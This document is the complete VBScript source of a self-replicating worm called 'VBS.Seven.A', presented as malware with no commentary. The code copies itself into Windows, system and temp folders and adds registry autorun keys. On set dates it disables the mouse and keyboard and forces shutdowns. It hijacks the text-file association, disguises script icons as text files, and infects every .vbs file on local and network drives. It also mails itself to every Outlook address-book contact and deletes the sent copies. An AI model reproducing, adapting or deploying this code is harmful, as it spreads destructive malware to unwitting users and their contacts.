'VBS.Seven.A
On Error Resume Next
Set fso=CreateObject("Scripting.FileSystemObject")
Set ws=CreateObject("WScript.Shell")
Set win=fso.GetSpecialFolder(0)
Set sys=fso.GetSpecialFolder(1)
Set tmp=fso.GetSpecialFolder(2)

SEVEN()

Sub SEVEN()
Set org=fso.GetFile(WScript.ScriptFullname)
org.Copy(win&"\Seven.vbs")
org.Copy(sys&"\Envy.vbs")
org.Copy(tmp&"\Lust.vbs")
run=("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Envy")
runs=("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\Lust")
ws.RegWrite run,sys&"\Envy.vbs"
ws.RegWrite runs,tmp&"\Lust.vbs"
First()
Second()
Third()
Disk()
Send()
End Sub

Sub First()
If Day(Now)=1 or Day(Now)=15 or Day(Now)=30 Then
run2=("HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Anger")
ws.RegWrite run2,"rundll32 mouse,disable"
End If
End Sub

Sub Second()
If Day(Now)=12 or Day(Now)=28 Then
MsgBox "You're tired now"+VbCrLf+"Switch off you're Computer",vbExclamation,"Seven"
ws.Run "rundll32.exe user.exe,exitwindows"
End If
If Day(Now)=14 Then
MsgBox "The keyboard is on strike !",vbInformation,"Seven"
ws.Run "rundll32 keyboard,disable"
End If
End Sub

Sub Third()
If Day(Now)=5 or Day(Now)=17 Then
bur=ws.RegRead("HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Desktop")
if not fso.FileExists(win&"\COPYRIGHT.txt.vbs") Then
txt=ws.RegRead("HKCR\txtfile\shell\open\command\")
ws.RegWrite "HKCR\txtfile\shell\open\command\Pride",txt
ws.RegWrite "HKCR\txtfile\shell\open\command\","wscript "&win&"\Seven.vbs"
icot=ws.RegRead("HKCR\txtfile\DefaultIcon\")
icov=ws.RegRead("HKCR\VBSfile\DefaultIcon\")
ws.RegWrite "HKCR\VBSfile\DefaultIcon\oldicon",icov
ws.RegWrite "HKCR\VBSfile\DefaultIcon\",icot
Set copy=fso.CreateTextFile (bur&"\COPYRIGHT.txt.vbs")
copy.WriteLine "MsgBox ""You're infected by my new Worm""+VbCrLf+VbCrLf+""	By PetiK (c)2001"",vbcritical,""VBS.Seven.A"""
copy.Close
Set copy=fso.CreateTextFile (win&"\COPYRIGHT.txt.vbs")
copy.WriteLine "MsgBox ""You're infected by my new Worm""+VbCrLf+VbCrLf+""	By PetiK (c)2001"",vbcritical,""VBS.Seven.A"""
copy.Close
end if
End If
End Sub

Sub Disk
Set dr=fso.Drives
For Each d in dr
If d.DriveType=2 or d.DriveType=3 Then
list(d.path&"\")
end If
Next
End Sub
Sub infect(dossier)
Set f=fso.GetFolder(dossier)
Set fc=f.Files
For each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
If (ext="vbs") Then
Set cot=fso.OpenTextFile(f1.path, 1, False)
If cot.ReadLine <> "'VBS.Seven.A" then
cot.Close
Set cot=fso.OpenTextFile(f1.path, 1, False)
vbsorg=cot.ReadAll()
cot.Close
Set inf=fso.OpenTextFile(f1.path,2,True)
inf.WriteLine "'VBS.Seven.A"
inf.Write(vbsorg)
inf.WriteLine ""
inf.WriteLine "Set w=CreateObject(""WScript.Shell"")"
inf.WriteLine "Set f=CreateObject(""Scripting.FileSystemObject"")"
inf.WriteLine "w.run f.GetSpecialFolder(0)&""\Seven.vbs"""
inf.Close
End If
End If
Next
End Sub
Sub list(dossier)
Set f=fso.GetFolder(dossier)
Set sf=f.SubFolders
For each f1 in sf
infect(f1.path)
list(f1.path)
Next
End Sub

Sub Send()
Set A=CreateObject("Outlook.Application")
Set B=A.GetNameSpace("MAPI")
For Each C In B.AddressLists
If C.AddressEntries.Count <> 0 Then
For D=1 To C.AddressEntries.count
Set E=C.AddressEntries(D)
Set F=A.CreateItem(0)
F.To=E.Address
F.Subject="What is the seven sins ??"
F.Body="Look at this file and learn them."
Set G=CreateObject("Scripting.FileSystemObject")
F.Attachments.Add G.BuildPath(G.GetSpecialFolder(0),"Seven.vbs")
F.DeleteAfterSubmit=True
If F.To <> "" Then
F.Send
End If
Next
End If
Next
End Sub